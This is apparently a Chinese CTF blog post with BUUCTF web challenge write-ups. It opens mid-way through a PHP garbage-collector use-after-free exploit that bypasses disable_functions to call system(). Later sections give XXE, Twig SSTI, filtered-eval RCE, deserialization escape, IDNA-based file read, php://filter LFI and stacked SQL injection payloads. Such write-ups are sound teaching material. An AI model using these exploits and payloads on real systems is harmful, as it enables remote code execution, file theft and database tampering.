get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n        \n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload\n\n```\n?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=\n```\n\n---\n\n# 03.02\n\n---\n\n# [NCTF2019]Fake XML cookbook\n\n根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。\n\n使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目\n\n```\nPOST\nContent-Type: application/xml;\n\n\n<user><username>1</username><password>2</password></user>\n```\n\n去摸一个payload试试\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE test [\n  <!ENTITY admin SYSTEM \"file:///etc/passwd\">\n  ]>\n<user><username>&admin;</username><password>123456</password></user>\n```\n\n成功读取文件\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png)\n\n把路径改为/flag，获得flag\n\n---\n\n# [ASIS 2019]Unicorn shop\n\n这道题绝活。学到了unicode的安全问题：[浅谈Unicode设计的安全性](https://xz.aliyun.com/t/5402)，看了wp。\n\n进入网站一个本杰明·富兰克林至理名言：\n\n> 金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多\n>\n\n~~差点信了，我就要赚钱花(小声bb)~~\n\n下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示                                    ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。\n\n一个和unicode有关的网站：https://www.compart.com/en/unicode\n\n网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索thousand，找1377以上的都可。\n\n我选的是这个`፼`数值是1w，直接传传不过去，使用url编码一次再传。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png)\n\n---\n\n# [BJDCTF2020]Cookie is so stable\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png)\n\n这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有\n\n> Why not take a closer look at cookies?\n\n去flag.php提交个1之后，看cookie为\n\n```\nCookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1\n```\n\n一目了然，接下来就是找payload。再使用之前的\n\n```\n{system('cat /flag')}\n```\n\n被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload\n\n```\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}}\n```\n\n我是受了这位师傅的[文章](https://www.cnblogs.com/bmjoker/p/13508538.html)启发，又去结合了下这道题的[源码](https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig)才搞明白。\n\n这道题在渲染之前使用了twig模板：\n\n> Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。\n\n我同样在题目的源码中找到了`render()`方法和`Twig_Environment`配置信息\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png)\n\n然后payload的具体原理在的`Environment.php`中,贴一下和payload相关部分：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png)\n\n1. 先执行`{{_self.env.registerUndefinedFilterCallback(\"exec\")}}`调用了`registerUndefinedFilterCallback()`函数(图中884行)，注册了一个未定义的函数到`filterCallbacks`全局变量中\n2. 接着执行`{{_self.env.getFilter(\"whoami\")}}`调用了`getFilter()`函数，并传入变量`$name`值为执行的命令，当函数执行到图中代码875行时，进入循环执行了`call_user_func()`，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的`filterCallbacks`全局变量，里边已经躺好了一个刚刚注册的`exec`，至此就形成了payload\n\n---\n\n# 小彩蛋\n\n现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png)\n\n挺草的记一下。\n\n---\n\n# [CISCN 2019 初赛]Love Math\n\n源码：\n\n```php\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\n快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。\n\n[刷题记录：[CISCN 2019 初赛]Love Math](https://www.cnblogs.com/20175211lyz/p/11588219.html)\n\n最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。\n\n利用`$whitelist`里的函数名称和数字遍历异或`^`，Fuzz找出来需要的字母，然后拼接一个`_GET`传参执行命令。\n\nFuzz的代码\n\n```php\n<?php\n$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n\n$exp='';\nfor ($i=0; $i < count($whitelist); $i++) { \n\tfor ($j=0; $j < 1000; $j++) { \n\t\t$exp=$whitelist[$i]^$j.\"\";\n\t\techo $whitelist[$i].\"^\".$j.\"----\".$exp;\n\t\techo \"\\n\";\n\t}\n}\n```\n\n需要知道的有，php某个版本以后可以使用函数名加`()`的方式调用函数，如\n\n```php\n<?php\n\necho base_convert(\"strtoupper\", 36, 10);\n$cos=base_convert(\"2927671435926243\", 10, 36);\necho \"\\n\".$cos(\"abc\");\n```\n\n上面代码是把字符串**strtoupper**赋值到变量`$cos`，然后直接使用`$cos()`执行`strtoupper()`函数。代码中使用`base_convert`函数也是这道题的一种思路哦。﹙ˊ_>ˋ﹚\n\n还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号`()`括起来就可以了。`$`如果直接拼接到字符串上也是不可以的，需要使用形如`$$cos`才可以正确的指向变量。\n\n最终payload：\n\n```php\n?c=$cos=(is_finite^(6).(4)).(rad2deg^(7).(5));$cos=$$cos;$cos{0}($cos{1})&0=system&1=cat /flag\n```\n\n\n\n---\n\n# [0CTF 2016]piapiapia\n\n使用目录扫描发现了www.zip网站备份。\n\n网站结构\n\n> static\n>\n> upload\n>\n> class.php\n>\n> config.php\n>\n> index.php\n>\n> profile.php\n>\n> register.php\n>\n> update.php\n\n发现有register就去注册个试试呗\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png)\n\n注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号\n\n邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：\n\n```html\n<img src=\"data:image/gif;base64,.......\n```\n\n查看源码profile.php中是这样的\n\n```php\n$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n```\n\n读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了`unserialize`，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地\n\n```php\n<?php\n\t$config['hostname'] = '127.0.0.1';\n\t$config['username'] = 'root';\n\t$config['password'] = '';\n\t$config['database'] = '';\n\t$flag = '';\n?>\n```\n\n~~下载的源码肯定不会把flag直接给你~~，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：`filter`\n\n```php\n$username = parent::filter($username);\n$password = parent::filter($password);\n```\n\n跟进一下\n\n```php\npublic function filter($string) {\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n\n过滤`_`，select、insert、update、delete、where会被替换成`hacker`，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用[PHP反序列化字符串逃逸](https://my.oschina.net/u/3076320/blog/4372683)，序列化的结尾是`\";}`可以手动构造闭合。\n\n现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工\n\n先上payload\n\n```code\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。\n\n受到了这位师傅的博客[[0CTF 2016]piapiapia](https://blog.csdn.net/weixin_44077544/article/details/102703489)，我尝试了下`$profile`属性其实是一个**关联数组**，是键值对形式的，并且字符串可能是嵌套起来的，形如\n\n```php\n<?php\nclass profile{\n\tpublic $file = 'a:2:{s:8:\"nickname\";s:5:\"where\";s:5:\"photo\";s:3:\"233\";}';\n\tpublic $upload =\"2333\";\n}\n$s1= new profile();\necho serialize($s1);\n```\n\n结果是\n\n```php\nO:7:\"profile\":2:{s:4:\"file\";s:56:\"a:2:{s:8:\"nickname\";s:15:\"where\";s:5:\"photo\";s:3:\"233\";}\";s:6:\"upload\";s:4:\"2333\";}\n```\n\n这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png)\n\n报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。\n\n查看页面的图片内容\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png)\n\nbase64解码\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png)\n\n\n\n---\n\n# [SUCTF 2019]Pythonginx\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png)\n\n整理一下源码\n\n```python\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n三个if都是判断`host == 'suctf.cc'`，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断`==`，回过头来注意到了**第二个**if中有`newhost.append(h.encode('idna').decode('utf-8'))`进行了一波编码，那么问题就出在了这里。\n\n所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母`c`，那么我就找第一个字母`s`验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，**需要多试几个**。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png)\n\n我选出的是这个字符`𝐬`，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：\n\n```code\n/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd\n```\n\n\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png)\n\nflag并不在其中，并且也不再根目录下，根据题目中有`nginx`应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：\n\n> 配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf\n>\n> 主配置文件：/etc/nginx/conf/nginx.conf\n>\n> 管理脚本：/usr/lib64/systemd/system/nginx.service\n>\n> 模块：/usr/lisb64/nginx/modules\n>\n> 应用程序：/usr/sbin/nginx\n>\n> 程序默认存放位置：/usr/share/nginx/html\n>\n> 日志默认存放位置：/var/log/nginx\n\n读配置文件\n\n```code\n/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png)\n\n读flag\n\n```\n/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png)\n\n\n\n参考的博客链接：\n\nhttps://www.xmsec.cc/suctf19-wp/\n\nhttps://xz.aliyun.com/t/6042#toc-24\n\nhttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\n\n---\n\n# [BSidesCF 2020]Had a bad day\n\n看这个标题我推一下OWRLD ORDER的[Have a nice day](https://www.bilibili.com/video/BV1Bb411K7Gd)\n\n页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为\n\n```url\n/index.php?category=woofers\n```\n\n尝试输入flag会显示\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png)\n\n只能有`woofers`和`meowers`可以通过，尝试了下php的`filter`伪协议读文件\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png)\n\n读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：\n\n```html\n<center>\n\t<h4> Woof! Woof! </h4>\n</center>\n<img style=\"width:100%\" src=\"img/dog/<?php echo rand(1,10)?>.jpg\">\n```\n\n多尝试以后发现可以读`index`，下面是主要的源码：\n\n```php\n<?php\n$file = $_GET['category'];\nif(isset($file)){\nif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\")){\n\t\t\t\t\t\tinclude ($file . '.php');\n\t\t\t\t\t}\n\t\t\t\t\telse{\n\t\t\t\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t?>\n```\n\n可以看到if判断中需要字符串包含`woofers`、`meowers`、`index`，那么我们只需要在filter伪协议中插入字符串绕过判断即可。\n\n**需要知道的**：filter可以设定一个或多个过滤器名称，以管道符`\\`分隔，所以构造payload：\n\n```\n/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag\n```\n\n读出来以后解密即可获得flag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png)\n\n搜索的时候学到了一个其他的截断\n\n```\nzip://test.zip#hello.html.php\n```\n\n代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。\n\n","source":"_posts/BUUCTF寒假刷题-Web.md","raw":"---\ntitle: BUUCTF寒假刷题-Web\ndate: 2021-01-18 16:58:56\ncategories: \n- CTF\ntags:\n- Web\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223242.jpg\n---\n\n寒假横向刷题（尽量）\n[BUUCTF](https://buuoj.cn/challenges#)\n💗🧡💛💚💙💜🤎🖤🤍\n**题都写这一个里面了，可以先用<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨** \n\n# 2021.01.15\n\n# [HCTF 2018]WarmUp\n\n进到靶机一个硕大的滑稽，查看源码有提示source.php\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png)\n\n```\n<?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?>\n```\n\n发现白名单有source.php和hint.php，先去查看一下hint.php\n\n> flag not here, and flag in ffffllllaaaagggg\n\n分析源码\n\n* 判断`$_REQUEST['file']`对象为空且为字符串\n* 执行emmm类中的**checkFile**方法判断是否在白名单（确保函数返回是true）\n* 文件包含\n\ncheckFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。\n\n1. 第一种\n\n```\nfile=hint.php?../../../../../ffffllllaaaagggg\n```\n\n字符串截取将原字符串尾部加上`?`再截取第一个`?`之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的`../`返回上级目录。\n\n2.  第二种\n\n```\nhint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg\n```\n\n将第一种payload使用urlencode编码即可。\n\n--------------------\n\n# [强网杯 2019]随便注\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png)\n\n根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：\n\n```\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n这道题使用的是堆叠注入，原理\n\n> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n\n查看数据库\n\n```\n1';show databases;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png)\n\n查看当前库下的表\n\n```\n1';show tables;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png)\n\n查看两张表字段\n\n```\n1';show columns from words;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png)\n\n还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n\n```\n1';desc `1919810931114514`;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png)\n\n找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是**word**表中的字段，而flag在**1919810931114514**表中。\n\n网上找到的两种方法，分别是修改表名和使用预处理语句。\n\n1. 使用[预处理](https://www.cnblogs.com/geaozhang/p/9891338.html)语句\n\n因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。\n\n```\nchar(115,101,108,101,99,116)\n```\n\n根据预处理语句格式构造payload\n\n* 创建一个**sqli**字符串值为查询sql语句，使用预处理语句赋值并执行。\n\n```\n1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;#\n```\n\n* 不使用变量\n\n```\n1';PREPARE sqli FROM CONCAT('s','elect',' * from `1919810931114514`');EXECUTE sqli; #\n```\n\n* 还有一种\n\n```\n1';SET @sqli = CONCAT('s','e','l','e','c','t',' * from `1919810931114514`');PREPARE haha FROM@sqli ;EXECUTE haha; #\n```\n\n主要区别在于过滤的绕过方式，不要拘泥于一种方式。\n\n2. 修改表名\n\n修改表名的思路是：默认查询的是**word**表第一个字段，所以把**word**表修改为其他名称，将flag所在的**1919810931114514**表名修改为**word**。\n\n网上payload\n\n```\n0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#\n```\n\n自己构造的payload\n\n```\n0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #\n```\n\n之后执行\n\n```\n1' or 1=1 #\n```\n\n查询表所有字段值即可。\n\n---------------\n\n# [极客大挑战 2019]EasySQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png)\n\n用户名密码，尝试万能密码。\n\n```\n'or 1=1 #\n随便密码\n```\n\n一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html\n\n---------------------\n\n# [极客大挑战 2019]Havefun\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png)\n\n直接源码找到php代码。payload\n\n```\n?cat=dog\n```\n\n------------------------\n\n# [SUCTF 2019]EasySQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png)\n\n单引号无报错，尝试堆叠注入可以回显。\n\n和 [强网杯 2019]随便注这道题一样查库查表查字段\n\n```\n1;show databases;\n1;show tables;\n```\n\n但是执行\n\n```\n1;desc `Flag`;\n1;show columns from Flag;\n```\n\n返回了\"Nonono.“测试出被过滤了：desc、from、Flag。\n\n接下来的都是抄网上的预期解也是第一次见。\n\n比赛时源码泄露\n\n```\nselect $_GET['query'] || flag from flag\n```\n\n> 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode\n> 模式：pipes_as_concat 来实现oracle 的一些功能\n\npayload\n\n```\n1;set sql_mode=PIPES_AS_CONCAT;select 1\n```\n\n非预期解\n\n```\n*,1 \n```\n\n----------------------\n\n# [ACTF2020 新生赛]Include\n\n不截图了，进入靶机只有一个**tips**等着被点。跳转以后看url中参数\n\n```\n?file=flag.php\n```\n\n页面内容只有\n\n> Can you find out the flag?\n\n立马想到使用php伪协议读文件内容。使用filter过滤器\n\n```\n?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n得到\n\n```\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=\n```\n\n解密得到flag\n\n-------------------------\n\n# [极客大挑战 2019]Secret File\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png)\n\n查看源码，又一个背景是黑色的超链接跳转到 